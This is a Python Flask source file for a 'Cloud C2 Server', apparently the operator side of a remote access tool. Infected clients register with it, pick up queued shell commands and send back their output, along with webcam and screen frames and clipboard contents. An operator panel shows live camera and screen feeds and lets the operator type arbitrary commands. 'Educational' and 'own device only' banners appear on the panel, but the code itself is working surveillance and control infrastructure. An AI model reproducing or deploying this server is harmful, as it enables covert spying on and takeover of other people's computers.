#!/usr/bin/env python3
"""
🎯 CLOUD C2 SERVER - ZERO ERROR VERSION
"""
from flask import Flask, request, jsonify, render_template_string, Response
import json
import datetime
import base64
import time
import os

app = Flask(__name__)

clients = {}
commands = {}
results = {}
camera_streams = {}
screen_streams = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    client_id = data.get('client_id')
    if client_id:
        clients[client_id] = {
            'id': client_id,
            'hostname': data.get('hostname'),
            'os': data.get('os'),
            'last_seen': datetime.datetime.now().isoformat(),
        }
        return jsonify({'status': 'registered'})
    return jsonify({'status': 'error'}), 400

@app.route('/get_command/<client_id>')
def get_command(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
        if client_id in commands and commands[client_id]:
            return jsonify({'command': commands[client_id].pop(0)})
    return jsonify({'command': None})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.get_json()
    client_id = data.get('client_id')
    if client_id not in results: results[client_id] = []
    results[client_id].append({
        'command': data.get('command'),
        'output': data.get('output'),
        'timestamp': datetime.datetime.now().isoformat()
    })
    return jsonify({'status': 'received'})

@app.route('/stream_frame/<client_id>/<stream_type>', methods=['POST'])
def stream_frame(client_id, stream_type):
    data = request.get_json()
    img_data = data.get('image')
    if stream_type == 'camera':
        camera_streams[client_id] = img_data
    elif stream_type == 'screen':
        screen_streams[client_id] = img_data
    return jsonify({'status': 'ok'})

@app.route('/api/camera_feed/<client_id>')
def camera_feed(client_id):
    def generate():
        while True:
            img = camera_streams.get(client_id)
            if img:
                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + base64.b64decode(img) + b'\r\n')
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/api/screen_feed/<client_id>')
def screen_feed(client_id):
    def generate():
        while True:
            img = screen_streams.get(client_id)
            if img:
                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + base64.b64decode(img) + b'\r\n')
            time.sleep(0.1)
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🎯 Cloud Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Consolas', monospace; background: #0a0e17; color: #e0e0e0; padding: 15px; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; margin-bottom: 15px; }
            .warning { background: #1a0000; border: 1px solid #ff4444; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-size: 12px; }
            .card { background: #1a2332; padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid #1f2937; }
            .card h3 { color: #00d4ff; margin-bottom: 10px; font-size: 14px; }
            .client-card { background: #0f1622; padding: 12px; border-radius: 8px; border: 1px solid #1f2937; cursor: pointer; margin-bottom: 10px; }
            .client-card:hover { border-color: #00d4ff; }
            .status-online { color: #22c55e; }
            .command-row { display: flex; gap: 10px; margin: 10px 0; }
            .command-row input { flex: 1; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0; border-radius: 4px; font-family: monospace; }
            .command-row button { padding: 10px 20px; background: #00d4ff; color: #000; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
            .btn-row { display: flex; gap: 8px; flex-wrap: wrap; margin: 10px 0; }
            .btn { padding: 6px 12px; background: #1f2937; color: #e0e0e0; border: 1px solid #374151; border-radius: 4px; cursor: pointer; font-size: 11px; }
            .btn:hover { background: #374151; border-color: #00d4ff; }
            .btn-primary { background: #00d4ff; color: #000; border-color: #00d4ff; }
            .output { background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 12px; max-height: 200px; overflow-y: auto; border: 1px solid #333; white-space: pre-wrap; margin-top: 10px; }
            .stream-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
            .stream-box { background: #000; border-radius: 6px; min-height: 250px; display: flex; align-items: center; justify-content: center; border: 1px solid #333; }
            .stream-box img { width: 100%; max-height: 400px; object-fit: contain; }
            .no-client { color: #6b7280; text-align: center; padding: 20px; }
            .footer { color: #6b7280; font-size: 11px; text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #1f2937; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Cloud Control Panel</h1>
            <div class="warning">⚠️ YOUR OWN DEVICE ONLY. Educational.</div>
            
            <div class="card">
                <h3>💻 Your Computers</h3>
                <div id="clients"><div class="no-client">Loading...</div></div>
            </div>
            
            <div class="card" id="mainPanel" style="display:none;">
                <h3>💀 Commands</h3>
                <div class="command-row">
                    <input type="text" id="commandInput" placeholder="Enter command..." />
                    <button onclick="sendCommand()">▶ Execute</button>
                </div>
                <div class="btn-row">
                    <button class="btn" onclick="quickCommand('whoami')">👤 Whoami</button>
                    <button class="btn" onclick="quickCommand('ipconfig')">🌐 IP Config</button>
                    <button class="btn btn-primary" onclick="quickCommand('clipboard')">📋 Read Clipboard</button>
                    <button class="btn btn-primary" onclick="showTTS()">🔊 Text to Speech</button>
                </div>

                <div id="ttsBox" style="display:none; margin-bottom: 10px;">
                    <input type="text" id="ttsText" placeholder="Enter text for PC to speak..." style="width: 70%; padding: 8px; background: #000; color: #0f0; border: 1px solid #333;">
                    <button class="btn btn-primary" onclick="sendTTS()">Speak</button>
                </div>

                <div id="output" class="output">Select a computer...</div>
            </div>

            <div class="card" id="streamsPanel" style="display:none;">
                <h3>📷 Live Streams (Cloud)</h3>
                <div class="stream-grid">
                    <div>
                        <div style="color:#6b7280; margin-bottom:5px; font-size:12px;">Webcam:</div>
                        <div class="stream-box"><img id="camFeed" src="" /></div>
                    </div>
                    <div>
                        <div style="color:#6b7280; margin-bottom:5px; font-size:12px;">Screen:</div>
                        <div class="stream-box"><img id="screenFeed" src="" /></div>
                    </div>
                </div>
            </div>
            
            <div class="footer">⚠️ Educational Lab Only</div>
        </div>
        
        <script>
            let selectedClient = null;
            function refreshClients() {
                fetch('/api/clients').then(r => r.json()).then(data => {
                    const container = document.getElementById('clients');
                    if (data.length === 0) {
                        container.innerHTML = '<div class="no-client">No computers connected. Run client.py.</div>';
                        return;
                    }
                    container.innerHTML = data.map(c => `
                        <div class="client-card ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}')">
                            <div style="color:#00d4ff; font-weight:bold;">🖥️ ${c.hostname}</div>
                            <div style="font-size:11px; color:#6b7280;">Status: <span class="status-online">🟢 Online</span></div>
                        </div>
                    `).join('');
                });
            }
            function selectClient(id) {
                selectedClient = id;
                document.getElementById('mainPanel').style.display = 'block';
                document.getElementById('streamsPanel').style.display = 'block';
                document.getElementById('camFeed').src = `/api/camera_feed/${id}`;
                document.getElementById('screenFeed').src = `/api/screen_feed/${id}`;
                refreshClients();
                fetchResults();
            }
            function sendCommand() {
                const command = document.getElementById('commandInput').value;
                if (!command || !selectedClient) return alert('Select a PC and enter command');
                fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ client_id: selectedClient, command: command })
                }).then(() => {
                    document.getElementById('output').textContent = `⏳ Sent: ${command}`;
                    document.getElementById('commandInput').value = '';
                    setTimeout(fetchResults, 2000);
                });
            }
            function quickCommand(cmd) {
                document.getElementById('commandInput').value = cmd;
                sendCommand();
            }
            function showTTS() { document.getElementById('ttsBox').style.display = 'block'; }
            function sendTTS() {
                const text = document.getElementById('ttsText').value;
                if (!text) return;
                quickCommand('tts:' + text);
                document.getElementById('ttsText').value = '';
                document.getElementById('ttsBox').style.display = 'none';
            }
            function fetchResults() {
                if (!selectedClient) return;
                fetch(`/api/results/${selectedClient}`).then(r => r.json()).then(data => {
                    if (data.length > 0) {
                        const last = data[data.length - 1];
                        document.getElementById('output').textContent = `📥 ${last.command}\n\n${last.output}`;
                    }
                });
            }
            refreshClients();
            setInterval(refreshClients, 5000);
            setInterval(fetchResults, 3000);
        </script>
    </body>
    </html>
    ''')

@app.route('/api/clients')
def api_clients():
    return jsonify(list(clients.values()))

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.get_json()
    cid = data.get('client_id')
    if cid not in commands: commands[cid] = []
    commands[cid].append(data.get('command'))
    return jsonify({'status': 'queued'})

@app.route('/api/results/<client_id>')
def api_results(client_id):
    return jsonify(results.get(client_id, [])[-5:])
